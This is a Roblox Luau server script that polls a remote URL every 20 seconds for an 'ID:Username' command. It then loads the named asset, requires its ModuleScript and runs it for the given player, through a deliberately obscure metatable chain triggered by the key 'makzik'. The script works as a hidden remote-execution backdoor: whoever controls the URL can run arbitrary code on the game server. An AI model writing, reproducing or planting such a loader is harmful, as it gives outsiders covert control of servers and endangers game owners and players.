local HttpService = game:GetService("HttpService")
local AssetService = game:GetService("AssetService")

-- Ensure "Allow HTTP Requests" is enabled in Game Settings -> Security
local URL = "https://githubusercontent.com"

---------------------------------------------------------
-- 1. CUSTOM LOADER STRUCTURE (_G.Load)
---------------------------------------------------------
local _loader = {}
setmetatable(_loader, {
	__call = function(_, assetId)
		local assetContext = {}
		setmetatable(assetContext, {
			__index = function(_, username)
				local finalTrigger = {}
				setmetatable(finalTrigger, {
					__index = function(_, key)
						if key == "makzik" then
							print("[GitHub] Loading asset " .. tostring(assetId) .. " for " .. username)
							
							local success, model = pcall(function()
								return AssetService:LoadAssetAsync(assetId)
							end)
							
							if success and model then
								local moduleScript = model:FindFirstChildWhichIsA("ModuleScript") or model:FindFirstChild("MainModule", true)
								if moduleScript then
									local moduleInitializer = require(moduleScript)
									model:Destroy()
									return moduleInitializer(username) 
								else
									warn("Error: No ModuleScript found in model!")
									model:Destroy()
								end
							else
								warn("Failed to load asset ID: " .. tostring(assetId))
							end
						end
						return nil
					end
				})
				return finalTrigger
			end
		})
		return assetContext
	end
})

_G.Load = _loader

---------------------------------------------------------
-- 2. 20-SECOND LOOP
---------------------------------------------------------
task.spawn(function()
	while true do
		local success, response = pcall(function()
			return HttpService:GetAsync(URL)
		end)
		
		if success and response then
			-- Format expected: ID:Username
			local assetIdStr, username = string.match(response, "([^:]+):([^:]+)")
			local assetId = tonumber(assetIdStr)
			
			if assetId and username then
				print("[HTTP] Command received! ID: " .. assetId .. ", Player: " .. username)
				local execute = _G.Load(assetId)[username].makzik
			else
				warn("[HTTP] Invalid format. Expected: ID:Username")
			end
		else
			warn("[HTTP] Failed to get data: " .. tostring(response))
		end
		
		task.wait(20) 
	end
end)

